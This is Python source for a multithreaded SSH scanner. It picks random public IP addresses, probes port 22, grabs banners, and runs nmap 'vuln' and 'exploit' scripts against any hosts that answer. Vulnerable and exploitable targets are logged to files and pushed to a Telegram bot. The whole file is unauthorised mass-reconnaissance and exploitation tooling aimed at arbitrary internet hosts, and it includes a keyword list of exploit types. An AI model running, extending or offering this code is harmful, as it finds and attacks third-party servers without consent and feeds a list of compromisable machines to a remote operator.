class SSHScanner:
    def __init__(self, thread_count=50):
        self.targets = queue.Queue()
        self.thread_count = thread_count
        self.lock = threading.Lock()
        self.results = []
        self.sshs_found = []
        self.vulnerable_ips = []
        self.exploitable_ips = []
        self.scanned_ips = set()
        self.total_scanned = 0
        self.total_found = 0
        self.total_vulns = 0
        self.total_exploits = 0
        self.vuln_stats = {}
        self.sessions = []
        self.batch_count = 0

        # Telegram notifier
        self.telegram = TelegramNotifier()

        # Private IP ranges to skip
        self.private_ranges = [
            "10.", "172.16.", "172.17.", "172.18.", "172.19.",
            "172.20.", "172.21.", "172.22.", "172.23.", "172.24.",
            "172.25.", "172.26.", "172.27.", "172.28.", "172.29.",
            "172.30.", "172.31.", "192.168.", "127.", "169.254."
        ]

    def generate_random_ips(self, count=10000):
        """Generate random public IPs"""
        print(f"[*] Generating {count} random IPs...")
        self.telegram.send_message(f"🔄 <b>Scan Started</b>\n📌 Scanning {count} random IPs...")

        for _ in range(count):
            while True:
                a = random.randint(1, 223)
                if a == 127: continue
                b = random.randint(0, 255)
                c = random.randint(0, 255)
                d = random.randint(1, 254)
                ip = f"{a}.{b}.{c}.{d}"

                # Skip private IPs
                skip = False
                for private in self.private_ranges:
                    if ip.startswith(private):
                        skip = True
                        break
                if skip:
                    continue
                break

            self.targets.put(ip)

    def check_ssh_port(self, ip, port=22, timeout=2):
        """Check if SSH port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def get_ssh_banner(self, ip, port=22, timeout=2):
        """Get SSH banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return None

    def scan_ip(self, ip):
        """Scan a single IP for SSH"""
        if ip in self.scanned_ips:
            return

        with self.lock:
            self.scanned_ips.add(ip)
            self.total_scanned += 1

        if self.check_ssh_port(ip):
            banner = self.get_ssh_banner(ip)

            with self.lock:
                self.total_found += 1
                result = {
                    "ip": ip,
                    "port": 22,
                    "status": "OPEN",
                    "banner": banner if banner else "Unknown",
                    "timestamp": datetime.now().isoformat()
                }
                self.sshs_found.append(ip)
                self.results.append(result)

                print(f"[{self.total_found}] ✅ {ip} | SSH OPEN | {banner if banner else 'No Banner'}")

                # Save to file (local only)
                with open("ssh_ips.txt", "a") as f:
                    f.write(f"{ip}\n")

                # Send to Telegram (TEXT only)
                self.telegram.send_vps_found(ip, banner)

    def worker(self):
        """Thread worker for scanning"""
        while not self.targets.empty():
            try:
                ip = self.targets.get_nowait()
                self.scan_ip(ip)
                self.targets.task_done()
            except queue.Empty:
                break
            except Exception:
                self.targets.task_done()
                continue

    def run_nmap_vuln_scan(self, ip_list, threads=5):
        """Run nmap vulnerability scan on found IPs"""
        print("\n" + "="*70)
        print("🔐 NMAP VULNERABILITY SCAN")
        print("="*70)
        print(f"Targets: {len(ip_list)}")
        print(f"Threads: {threads}")
        print("="*70)

        if not ip_list:
            print("[!] No IPs to scan")
            return []

        results = []

        def scan_ip(ip):
            try:
                print(f"\n[*] Vulnerability Scanning: {ip}")
                cmd = f"nmap --script vuln -p 22 {ip} -oN nmap_vuln_{ip}.txt"
                subprocess.run(cmd, shell=True, timeout=300)

                # Parse results
                result_file = f"nmap_vuln_{ip}.txt"
                vulns = []
                if os.path.exists(result_file):
                    with open(result_file, 'r') as f:
                        content = f.read()

                    # Extract CVEs
                    vulns = re.findall(r'CVE-\d{4}-\d{4,7}', content)
                    vulns = list(set(vulns))

                    # Extract vulnerability descriptions
                    vuln_patterns = [
                        r'VULNERABLE:\s*([^\n]+)',
                        r'CVE-\d{4}-\d{4,7}.*?([^\n]+)',
                    ]

                    for pattern in vuln_patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            if match not in vulns and len(match) > 5:
                                vulns.append(match.strip())

                    if vulns:
                        print(f"  [+] Vulnerabilities found: {len(vulns)}")

                        # Run exploit scan on vulnerable IPs
                        exploits = self.run_nmap_exploit_scan(ip)

                        results.append({
                            "ip": ip,
                            "vulnerabilities": vulns,
                            "exploits": exploits,
                            "output": content[:1000],
                            "file": result_file
                        })

                        # Update stats
                        with self.lock:
                            self.total_vulns += 1
                            self.vulnerable_ips.append(ip)
                            for vuln in vulns:
                                self.vuln_stats[vuln] = self.vuln_stats.get(vuln, 0) + 1

                        # Send to Telegram
                        self.telegram.add_to_batch(ip, vulns, exploits)
                        self.batch_count += 1

                        # Save session
                        self.save_session(ip, vulns, exploits, content[:500])
                    else:
                        print(f"  ✅ No vulnerabilities found on {ip}")
            except Exception as e:
                print(f"  [!] Error scanning {ip}: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(scan_ip, ip) for ip in ip_list]
            for future in as_completed(futures):
                pass

        # Send remaining batch if less than 5
        if self.telegram.vps_batch:
            self.telegram.send_batch()

        return results

    def run_nmap_exploit_scan(self, ip):
        """Run nmap exploit scan on vulnerable IPs"""
        try:
            print(f"  [*] Exploit Scanning: {ip}")
            cmd = f"nmap --script exploit -p 22 {ip} -oN nmap_exploit_{ip}.txt"
            subprocess.run(cmd, shell=True, timeout=300)

            result_file = f"nmap_exploit_{ip}.txt"
            exploits = []

            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read()

                # Extract exploit information
                exploit_patterns = [
                    r'EXPLOIT:\s*([^\n]+)',
                    r'exploit\s*=\s*([^\n]+)',
                    r'EXPLOITABLE:\s*([^\n]+)',
                    r'CVE-\d{4}-\d{4,7}.*?EXPLOIT',
                    r'Metasploit.*?exploit',
                ]

                for pattern in exploit_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if len(match) > 5:
                            exploits.append(match.strip())

                # Check for known exploit keywords
                exploit_keywords = [
                    "exploit", "metasploit", "msf", "payload",
                    "rce", "remote code execution", "privilege escalation",
                    "buffer overflow", "authentication bypass"
                ]

                for keyword in exploit_keywords:
                    if keyword.lower() in content.lower():
                        exploits.append(f"Possible {keyword} exploit")

                exploits = list(set(exploits))

                if exploits:
                    print(f"    🔥 Exploits found: {len(exploits)}")
                    with self.lock:
                        self.total_exploits += 1
                        self.exploitable_ips.append(ip)

                    # Send exploit alert
                    self.telegram.send_exploit_found(ip, exploits)
                else:
                    print(f"    🔒 No exploits found")

            return exploits

        except Exception as e:
            print(f"  [!] Error in exploit scan: {e}")
            return []

    def save_session(self, ip, vulns, exploits, output):
        """Save scanning session"""
        session = {
            "ip": ip,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": vulns,
            "exploits": exploits,
            "output": output,
            "status": "completed"
        }

        with self.lock:
            self.sessions.append(session)

            # Save to file (local only)
            with open("sessions.json", "w") as f:
                json.dump(self.sessions, f, indent=2)

            # Save vulnerable IPs (local only)
            if vulns:
                with open("vulnerable_ips.txt", "a") as f:
                    f.write(f"{ip} | {', '.join(vulns)} | {datetime.now()}\n")

            # Save exploitable IPs
            if exploits:
                with open("exploitable_ips.txt", "a") as f:
                    f.write(f"{ip} | {', '.join(exploits)} | {datetime.now()}\n")

    def start_scan(self, ip_count=10000, threads=50):
        """Start the SSH scan"""
        print("="*70)
        print("🔍 SSH SCANNER + NMAP VULN + EXPLOIT + TELEGRAM")
        print("="*70)
        print(f"IPs to scan: {ip_count}")
        print(f"Threads: {threads}")
        print("="*70)

        # Send start message
        self.telegram.send_message(f"🚀 <b>SCAN STARTED</b>\n📌 Scanning {ip_count} random IPs\n🔄 Threads: {threads}")

        self.generate_random_ips(ip_count)

        # Start threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            thread_list.append(t)

        # Monitor progress
        while self.targets.qsize() > 0:
            time.sleep(2)
            remaining = self.targets.qsize()
            print(f"\r[*] Scanned: {self.total_scanned} | Found: {self.total_found} | Remaining: {remaining}", end="")

        self.targets.join()
        for t in thread_list:
            t.join(timeout=2)

        print("\n")
        self.show_summary()

    def show_summary(self):
        """Show scan summary"""
        print("="*70)
        print("📊 SCAN SUMMARY")
        print("="*70)
        print(f"Total IPs Scanned: {self.total_scanned}")
        print(f"SSH Servers Found: {self.total_found}")
        print("="*70)

    def load_ips_from_file(self, filename="ssh_ips.txt"):
        """Load IPs from file"""
        if not os.path.exists(filename):
            return []

        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]

